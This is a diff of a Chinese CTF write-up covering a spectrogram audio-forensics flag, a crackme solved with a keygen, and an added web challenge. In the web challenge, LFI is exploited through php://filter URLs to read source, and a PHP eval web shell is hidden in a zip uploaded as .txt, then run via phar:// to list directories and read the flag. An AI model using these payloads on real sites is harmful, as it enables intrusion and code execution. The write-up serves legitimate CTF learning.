@@ -5,9 +5,9 @@
 ![FFT](FFT.bmp)   
 显然高频区有问题，切换到spectrogram模式，如图，   
 ![spectrogram](spectrogram.bmp)   
-可看到高频区域有一些信息，   
+可看到高频区域有一些信息，以0.1+0.4*x秒的模式来读，   
 翻译成二进制得0b01100110、0b00110110，   
-也即是f6字符，猜测应该是flag{...}，   
+也即是"f6..."，猜测应该是"flag{...}"，   
 多看几个字符后发现每8位结尾都是0，   
 于是把每8bit倒序一下，得flag   
 `flag{f0r3ns1c_1s_r3al1y_v3ry_ve7y_fun}`
@@ -28,8 +28,7 @@ ida打开，发现0x400b56是关键部分，
 最后几位sn是废的，直接填1111   
 
 下面的代码有些细节也许不对，偶尔生成的sn有问题，但懒得看了，反正换了几个字符串来生成sn就过了   
-keygen.cpp   
-[code]   
+keygen.cpp     
 
 	#include "md5.h"
 	#include <iostream>
@@ -89,8 +88,7 @@ keygen.cpp
 		calc("1413191117121002");
 		return 0;
 	}
-
-[/code]   
+ 
 
 得到的sn:
 ```
@@ -105,3 +103,30 @@ keygen.cpp
 1118-4112-1151-8137-1111
 8115-5111-1181-4104-1111
 ```
+
+## 俳句
+
+容易发现url有形如`/index.php?page=[upload|view]`   
+发现LFI，用php filter来获取源代码   
+```
+/index.php?page=php://filter/read=convert.base64-encode/resource=index
+/index.php?page=php://filter/read=convert.base64-encode/resource=main
+/index.php?page=php://filter/read=convert.base64-encode/resource=view
+/index.php?page=php://filter/read=convert.base64-encode/resource=upload
+```
+发现有upload_paiju文件夹，还有index.php里有   
+```
+$inc=sprintf("%s.php", $p);
+include($inc);
+```
+用%00无法截断".php"无法直接include .txt，于是用phar来绕过这个：   
+制作一个名为1.txt的zip里面放a.php    
+a.php: `<?php eval($_GET['cmd']);?>`
+上传1.txt，用   
+`/index.php?page=phar://upload_paiju/xxxxxxx.txt/a`
+来成功include，然后是各种列目录：   
+`/index.php?cmd=print_r(scandir('/tmp'));&page=phar://./upload_paiju/xxxxxxx.txt/a`
+
+tmp目录，html目录(都是open_basedir)都找遍也没发现flag，    
+然后是队友发现藏在/srv(另外一open_basedir下)，有个FLAG文件...    
+那就`/index.php?cmd=print_r(file_get_contents('/srv/FLAG'));&page=phar://./upload_paiju/xxxxxxx.txt/a`得flag
